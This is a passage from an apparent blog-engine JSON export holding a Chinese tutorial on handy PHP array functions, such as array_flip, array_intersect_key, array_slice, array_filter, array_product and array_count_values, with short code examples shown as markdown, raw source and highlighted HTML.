666];\nvar_dump(array_values($input));\n// 结果 [0 => 233, 1 => 66]\n```\n\n需要注意的是 `array_values` 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 `array_slice` 函数\n\n```\n<?php\n$input = ['hello' => 'world', 0 => 233, 99 => 666];\nvar_dump(array_slice($input, 0));\n// 结果 ['hello' => 'world', 0 => 233, 1 => 66]\n```\n\n`array_slice` 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引\n\n### 清除空值\n\n有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、''空字符串、'0'字符串0 ，这时 `array_filter` 函数便能帮上忙\n\n```\n<?php\n$input = ['foo', false, -1, null, '', []];\nvar_dump(array_filter($input));\n// 结果 [0 => 'foo', 2 => -1]\n```\n\narray_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：\n\n> 如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目\n\n**注意：** 如果不填写 callback 函数，0、0.0、'0'字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数\n\n### 确认数组成员全部为真\n\n有时候我们希望确认数组中的的值全部为 true，比如：`['read' => true, 'write' => true, 'execute' => true]`，只需要用 `array_product` 函数便可以实现了\n\n```\n<?php\n$power = ['read' => true, 'write' => true, 'execute' => true];\nvar_dump((bool)array_product($power));\n// 结果 true\n$power = ['read' => true, 'write' => true, 'execute' => false];\nvar_dump((bool)array_product($power));\n// 结果 false\n```\n\narray_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false\n\n**注意：** 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果\n\n```\n<?php\n$power = ['read' => true, 'write' => true, 'execute' => 'true'];\nvar_dump((bool)array_product($power));\n// 结果 false\n```\n\n因为 'true' 在计算过程中被转为 0\n\n\n### 获取指定键名之前 / 之后的数组\n\n如果只想要关联数组中指定键名值之前的部分可以通过 `array_keys`、`array_search` 和 `array_slice` 组合使用便能够实现\n\n```\n<?php\n$data = ['first' => 1, 'second' => 2, 'third' => 3];\nfunction beforeKey($array, $key) {\n    $keys = array_keys($array);\n  \t// $keys = [0 => 'first', 1 => 'second', 2 => 'third']\n    $len = array_search($key, $keys);\n    return array_slice($array, 0, $len);\n}\nvar_dump(beforeKey($data, 'first'));\n// 结果 []\nvar_dump(beforeKey($data, 'second'));\n// 结果 ['first' => 1]\nvar_dump(beforeKey($data, 'third'));\n// 结果 ['first' => 1, 'second' => 2]\n```\n\n`array_slice` 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」\n\n`array_keys` 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：`[0 => 'first', 1 => 'second', 2 => 'third']` \n\n然后通过 `array_search` 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」\n\n有了偏移量直接调用 `array_slice` 函数便可以实现目的了\n\n\n那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可\n\n```\n<?php\n$data = ['first' => 1, 'second' => 2, 'third' => 3];\nfunction afterKey($array, $key) {\n    $keys = array_keys($array);\n    $offset = array_search($key, $keys);\n    return array_slice($array, $offset + 1);\n}\nvar_dump(afterKey($data, 'first'));\n// 结果 ['second' => 2, 'third' => 3]\nvar_dump(afterKey($data, 'second'));\n// 结果 ['third' => 3]\nvar_dump(afterKey($data, 'third'));\n// 结果 []\n```\n\n获取指定值之前或之后的数组，只需调用 `beforeKey($data, array_search($value, $data))`\n\n\n### 数组中重复次数最多的值\n\n假设有这样一个数组 `[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]`，如何获取数组中重复次数最多的值？关键在于 `array_count_values` 函数\n\n```\n<?php\n$data = [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8];\n$cv = array_count_values($data);\n// $cv = [6 => 2, 11 => 4, 2 => 2, 4 => 3, 7 => 1, 8 => 1]\narsort($cv);\n$max = key($cv);\nvar_dump($max);\n// 结果 11\n```\n\n`array_count_values `函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值\n\n这样便可以通过 `arsort` 函数对出现的次数进行降序排序并且保持索引关联\n\n最后使用 `key` 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值\n","source":"_posts/2019/5/巧用 PHP 数组函数.md","raw":"---\ntitle: 巧用PHP数组函数\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 32349\n---\n\nPHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）\n\n### 取指定键名\n\n对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 `['id' => 1, 'name' => 'zane', 'password' => '123456']` 此时若只想取包含 id 和 name\n\n\n```\n<?php\n$raw = ['id' => 1, 'name' => 'zane', 'password' => '123456'];\n// 自己用 PHP 实现\nfunction onlyKeys($raw, $keys) {\n    $new = [];\n    foreach ($raw as $key => $val) {\n        if (in_array($key, $keys)) {\n            $new[$key] = $val;\n        }\n    }\n\n    return $new;\n}\n// 用 PHP 内置函数实现\nfunction newOnlyKeys($array, $keys) {\n    return array_intersect_key($array, array_flip($keys));\n}\nvar_dump(onlyKeys($raw, ['id', 'name']));\n// 结果 ['id' => 1, 'name' => 'zane']\nvar_dump(newOnlyKeys($raw, ['id', 'name']));\n// 结果 ['id' => 1, 'name' => 'zane']\n```\n\n简单的介绍一下这两个函数的作用，首先是 `array_flip` 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 `[0 => 'id', 1 => 'name']` 转变为了 `['id' => 0, 'name' => 1]`。这样做的目的是为了向 `array_intersect_key` 函数服务，`array_intersect_key` 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值\n\n\n### 移除指定键名\n\n```\n<?php\n$raw = ['id' => 1, 'name' => 'zane', 'password' => '123456'];\n// 用 PHP 内置函数实现\nfunction removeKeys($array, $keys) {\n    return array_diff_key($array, array_flip($keys));\n}\n// 移除 id 键\nvar_dump(removeKeys($raw, ['id', 'password']));\n// 结果 ['name' => 'zane']\n```\n\n和上一个例子相比本例只是将 `array_intersect_key` 函数改为 `array_diff_key`(刚好和 `array_intersect_key` 的功能相反)\n\n### 数组去重\n\nPHP 内置了 array_unique 函数\n\n```\n<?php\n$input = ['you are' => 666, 'i am' => 233, 'he is' => 233, 'she is' => 666];\n$result = array_unique($input);\nvar_dump($result);\n// 结果 ['you are' => 666, 'i am' => 233]\n```\n\n用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：\n\n- array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名\n\n- 因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求\n\n续调用两次 `array_flip` 函数是不是就相当于实现了 `array_unique` 函数的功能？\n\n```\n<?php\n$input = ['you are' => 666, 'i am' => 233, 'he is' => 233, 'she is' => 666];\n$result = array_flip(array_flip($input));\nvar_dump($result);\n// 结果 ['she is' => 666, 'he is' => 233]\n```\n\n结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案\n\n> 如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃\n\n`array_unique` 保留第一个出现的键名，`array_flip `保留最后一个出现的键名\n\n**注意：** 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略\n\n此外，若不需要保留键名可以直接这样使用 `array_values(array_flip($input))`\n\n\n###  重置索引\n\n当想要对一个索引并不连续的数组进行重置时，比如数组：`[0 => 233, 99 => 666]`，对于这种数组我们只需要调用 `array_values` 函数即可实现\n\n```\n<?php\n$input = [0 => 233, 99 => 666];\nvar_dump(array_values($input));\n// 结果 [0 => 233, 1 => 66]\n```\n\n需要注意的是 `array_values` 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 `array_slice` 函数\n\n```\n<?php\n$input = ['hello' => 'world', 0 => 233, 99 => 666];\nvar_dump(array_slice($input, 0));\n// 结果 ['hello' => 'world', 0 => 233, 1 => 66]\n```\n\n`array_slice` 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引\n\n### 清除空值\n\n有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、''空字符串、'0'字符串0 ，这时 `array_filter` 函数便能帮上忙\n\n```\n<?php\n$input = ['foo', false, -1, null, '', []];\nvar_dump(array_filter($input));\n// 结果 [0 => 'foo', 2 => -1]\n```\n\narray_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：\n\n> 如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目\n\n**注意：** 如果不填写 callback 函数，0、0.0、'0'字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数\n\n### 确认数组成员全部为真\n\n有时候我们希望确认数组中的的值全部为 true，比如：`['read' => true, 'write' => true, 'execute' => true]`，只需要用 `array_product` 函数便可以实现了\n\n```\n<?php\n$power = ['read' => true, 'write' => true, 'execute' => true];\nvar_dump((bool)array_product($power));\n// 结果 true\n$power = ['read' => true, 'write' => true, 'execute' => false];\nvar_dump((bool)array_product($power));\n// 结果 false\n```\n\narray_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false\n\n**注意：** 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果\n\n```\n<?php\n$power = ['read' => true, 'write' => true, 'execute' => 'true'];\nvar_dump((bool)array_product($power));\n// 结果 false\n```\n\n因为 'true' 在计算过程中被转为 0\n\n\n### 获取指定键名之前 / 之后的数组\n\n如果只想要关联数组中指定键名值之前的部分可以通过 `array_keys`、`array_search` 和 `array_slice` 组合使用便能够实现\n\n```\n<?php\n$data = ['first' => 1, 'second' => 2, 'third' => 3];\nfunction beforeKey($array, $key) {\n    $keys = array_keys($array);\n  \t// $keys = [0 => 'first', 1 => 'second', 2 => 'third']\n    $len = array_search($key, $keys);\n    return array_slice($array, 0, $len);\n}\nvar_dump(beforeKey($data, 'first'));\n// 结果 []\nvar_dump(beforeKey($data, 'second'));\n// 结果 ['first' => 1]\nvar_dump(beforeKey($data, 'third'));\n// 结果 ['first' => 1, 'second' => 2]\n```\n\n`array_slice` 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」\n\n`array_keys` 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：`[0 => 'first', 1 => 'second', 2 => 'third']` \n\n然后通过 `array_search` 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」\n\n有了偏移量直接调用 `array_slice` 函数便可以实现目的了\n\n\n那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可\n\n```\n<?php\n$data = ['first' => 1, 'second' => 2, 'third' => 3];\nfunction afterKey($array, $key) {\n    $keys = array_keys($array);\n    $offset = array_search($key, $keys);\n    return array_slice($array, $offset + 1);\n}\nvar_dump(afterKey($data, 'first'));\n// 结果 ['second' => 2, 'third' => 3]\nvar_dump(afterKey($data, 'second'));\n// 结果 ['third' => 3]\nvar_dump(afterKey($data, 'third'));\n// 结果 []\n```\n\n获取指定值之前或之后的数组，只需调用 `beforeKey($data, array_search($value, $data))`\n\n\n### 数组中重复次数最多的值\n\n假设有这样一个数组 `[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]`，如何获取数组中重复次数最多的值？关键在于 `array_count_values` 函数\n\n```\n<?php\n$data = [6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8];\n$cv = array_count_values($data);\n// $cv = [6 => 2, 11 => 4, 2 => 2, 4 => 3, 7 => 1, 8 => 1]\narsort($cv);\n$max = key($cv);\nvar_dump($max);\n// 结果 11\n```\n\n`array_count_values `函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值\n\n这样便可以通过 `arsort` 函数对出现的次数进行降序排序并且保持索引关联\n\n最后使用 `key` 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值\n","slug":"2019/5/巧用 PHP 数组函数","published":1,"date":"2019-04-18T03:34:48.341Z","updated":"2020-04-12T06:34:43.623Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck9z76vzk000m44vqdjzn118e","content":"<p>PHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）</p>\n<h3 id=\"取指定键名\"><a href=\"#取指定键名\" class=\"headerlink\" title=\"取指定键名\"></a>取指定键名</h3><p>对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 <code>[&#39;id&#39; =&gt; 1, &#39;name&#39; =&gt; &#39;zane&#39;, &#39;password&#39; =&gt; &#39;123456&#39;]</code> 此时若只想取包含 id 和 name</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$raw = [<span class=\"string\">'id'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'zane'</span>, <span class=\"string\">'password'</span> =&gt; <span class=\"string\">'123456'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 自己用 PHP 实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">onlyKeys</span><span class=\"params\">($raw, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $new = [];</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">foreach</span> ($raw <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> (in_array($key, $keys)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            $new[$key] = $val;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $new;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 用 PHP 内置函数实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">newOnlyKeys</span><span class=\"params\">($array, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_intersect_key($array, array_flip($keys));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\">var_dump(onlyKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane']</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(newOnlyKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['id' =&gt; 1, 'name' =&gt; 'zane']</span></span></span><br></pre></td></tr></table></figure>\n<p>简单的介绍一下这两个函数的作用，首先是 <code>array_flip</code> 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 <code>[0 =&gt; &#39;id&#39;, 1 =&gt; &#39;name&#39;]</code> 转变为了 <code>[&#39;id&#39; =&gt; 0, &#39;name&#39; =&gt; 1]</code>。这样做的目的是为了向 <code>array_intersect_key</code> 函数服务，<code>array_intersect_key</code> 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值</p>\n<h3 id=\"移除指定键名\"><a href=\"#移除指定键名\" class=\"headerlink\" title=\"移除指定键名\"></a>移除指定键名</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$raw = [<span class=\"string\">'id'</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'zane'</span>, <span class=\"string\">'password'</span> =&gt; <span class=\"string\">'123456'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 用 PHP 内置函数实现</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">removeKeys</span><span class=\"params\">($array, $keys)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> array_diff_key($array, array_flip($keys));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 移除 id 键</span></span></span><br><span class=\"line\"><span class=\"php\">var_dump(removeKeys($raw, [<span class=\"string\">'id'</span>, <span class=\"string\">'password'</span>]));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['name' =&gt; 'zane']</span></span></span><br></pre></td></tr></table></figure>\n<p>和上一个例子相比本例只是将 <code>array_intersect_key</code> 函数改为 <code>array_diff_key</code>(刚好和 <code>array_intersect_key</code> 的功能相反)</p>\n<h3 id=\"数组去重\"><a href=\"#数组去重\" class=\"headerlink\" title=\"数组去重\"></a>数组去重</h3><p>PHP 内置了 array_unique 函数</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'you are'</span> =&gt; <span class=\"number\">666</span>, <span class=\"string\">'i am'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'he is'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'she is'</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">$result = array_unique($input);</span></span><br><span class=\"line\"><span class=\"php\">var_dump($result);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['you are' =&gt; 666, 'i am' =&gt; 233]</span></span></span><br></pre></td></tr></table></figure>\n<p>用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：</p>\n<ul>\n<li><p>array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名</p>\n</li>\n<li><p>因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求</p>\n</li>\n</ul>\n<p>续调用两次 <code>array_flip</code> 函数是不是就相当于实现了 <code>array_unique</code> 函数的功能？</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'you are'</span> =&gt; <span class=\"number\">666</span>, <span class=\"string\">'i am'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'he is'</span> =&gt; <span class=\"number\">233</span>, <span class=\"string\">'she is'</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">$result = array_flip(array_flip($input));</span></span><br><span class=\"line\"><span class=\"php\">var_dump($result);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['she is' =&gt; 666, 'he is' =&gt; 233]</span></span></span><br></pre></td></tr></table></figure>\n<p>结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案</p>\n<blockquote>\n<p>如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃</p>\n</blockquote>\n<p><code>array_unique</code> 保留第一个出现的键名，<code>array_flip</code>保留最后一个出现的键名</p>\n<p><strong>注意：</strong> 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略</p>\n<p>此外，若不需要保留键名可以直接这样使用 <code>array_values(array_flip($input))</code></p>\n<h3 id=\"重置索引\"><a href=\"#重置索引\" class=\"headerlink\" title=\"重置索引\"></a>重置索引</h3><p>当想要对一个索引并不连续的数组进行重置时，比如数组：<code>[0 =&gt; 233, 99 =&gt; 666]</code>，对于这种数组我们只需要调用 <code>array_values</code> 函数即可实现</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"number\">0</span> =&gt; <span class=\"number\">233</span>, <span class=\"number\">99</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_values($input));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 [0 =&gt; 233, 1 =&gt; 66]</span></span></span><br></pre></td></tr></table></figure>\n<p>需要注意的是 <code>array_values</code> 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 <code>array_slice</code> 函数</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'hello'</span> =&gt; <span class=\"string\">'world'</span>, <span class=\"number\">0</span> =&gt; <span class=\"number\">233</span>, <span class=\"number\">99</span> =&gt; <span class=\"number\">666</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_slice($input, <span class=\"number\">0</span>));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 ['hello' =&gt; 'world', 0 =&gt; 233, 1 =&gt; 66]</span></span></span><br></pre></td></tr></table></figure>\n<p><code>array_slice</code> 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引</p>\n<h3 id=\"清除空值\"><a href=\"#清除空值\" class=\"headerlink\" title=\"清除空值\"></a>清除空值</h3><p>有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、’’空字符串、’0’字符串0 ，这时 <code>array_filter</code> 函数便能帮上忙</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$input = [<span class=\"string\">'foo'</span>, <span class=\"keyword\">false</span>, <span class=\"number\">-1</span>, <span class=\"keyword\">null</span>, <span class=\"string\">''</span>, []];</span></span><br><span class=\"line\"><span class=\"php\">var_dump(array_filter($input));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 [0 =&gt; 'foo', 2 =&gt; -1]</span></span></span><br></pre></td></tr></table></figure>\n<p>array_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：</p>\n<blockquote>\n<p>如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目</p>\n</blockquote>\n<p><strong>注意：</strong> 如果不填写 callback 函数，0、0.0、’0’字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数</p>\n<h3 id=\"确认数组成员全部为真\"><a href=\"#确认数组成员全部为真\" class=\"headerlink\" title=\"确认数组成员全部为真\"></a>确认数组成员全部为真</h3><p>有时候我们希望确认数组中的的值全部为 true，比如：<code>[&#39;read&#39; =&gt; true, &#39;write&#39; =&gt; true, &#39;execute&#39; =&gt; true]</code>，只需要用 <code>array_product</code> 函数便可以实现了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"keyword\">true</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 true</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"keyword\">false</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 false</span></span></span><br></pre></td></tr></table></figure>\n<p>array_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false</p>\n<p><strong>注意：</strong> 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">$power = [<span class=\"string\">'read'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'write'</span> =&gt; <span class=\"keyword\">true</span>, <span class=\"string\">'execute'</span> =&gt; <span class=\"string\">'true'</span>];</span></span><br><span class=\"line\"><span class=\"php\">var_dump((bool)array_product($power));</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// 结果 false</span></span></span><br></pre></td></tr></table></figure>\n<p>因为 ‘true’ 在计算过程中被转为 0</p>\n<h3 id=\"获取指定键名之前-之后的数组\"><a href=\"#获取指定键名之前-之后的数组\" class=\"headerlink\" 